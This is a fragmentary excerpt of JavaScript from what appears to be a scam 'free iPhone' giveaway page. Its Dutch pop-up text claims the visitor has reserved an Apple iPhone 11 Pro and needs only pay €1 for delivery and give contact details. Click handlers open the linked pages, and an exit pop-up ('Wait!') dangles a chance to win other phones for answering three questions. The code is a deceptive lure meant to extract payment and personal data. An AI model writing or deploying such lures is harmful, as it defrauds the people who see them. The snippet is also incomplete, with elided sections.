...
(function () {
    ...
    function onDOMContentLoaded() {
        ...
        var jheader = document.getElementsByClassName("jingle-header-crutch")[0].outerHTML;
         var takeitessage = '<div>Uw <span class="marked">Apple iPhone 11 Pro</span> werd gereserveerd!</div><br>Voorwaarden:<br>1. Vul op de volgende pagina de verzendkosten en de contactgegevens in;<br>2. Betaal slechts € 1 voor de levering van uw geschenk;<br>3. Uw Apple iPhone 11 Pro wordt binnen twee werkdagen via DHL verzonden.</div>';
        ...
        document.querySelectorAll('.qu-take-it')[1].addEventListener('click', function (e) {
            ...
            Jingle.fire(jheader + takeitessage2, 'OK', false, function () {
                window.disableExitPop = true;
                window.open(document.querySelectorAll('.qu-take-it')[1].href,'_blank');
                this.modal.classList.remove('tingle-modal--visible');
                document.body.classList.remove('tingle-enabled');
                this.modal.style.display = 'none';
        ...
        document.querySelectorAll('.qu-take-it')[2].addEventListener('click', function (e) {
            e.preventDefault();
            Jingle.fire(jheader + takeitessage3, 'OK', false, function () {
                window.disableExitPop = true;
                window.open(document.querySelectorAll('.qu-take-it')[2].href,'_blank');
                this.modal.classList.remove('tingle-modal--visible');
                document.body.classList.remove('tingle-enabled');
                this.modal.style.display = 'none';
        ...
        var logomessage = '<div class="text-center">Wait!</div><br>Before going back to home page, answer 3 simple questions and get a chance to win <span class="marked"><span class="marked">Huawei P30 Pro, iPhone X or iPad Air 2.</span></span></div>';
